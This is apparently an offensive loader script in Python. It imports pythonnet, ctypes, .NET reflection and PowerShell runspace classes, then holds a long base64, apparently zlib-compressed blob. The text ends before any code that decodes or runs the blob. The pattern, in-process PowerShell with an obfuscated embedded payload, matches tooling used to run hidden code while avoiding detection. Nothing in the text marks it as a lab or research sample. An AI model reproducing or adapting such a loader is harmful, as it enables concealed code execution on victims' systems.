import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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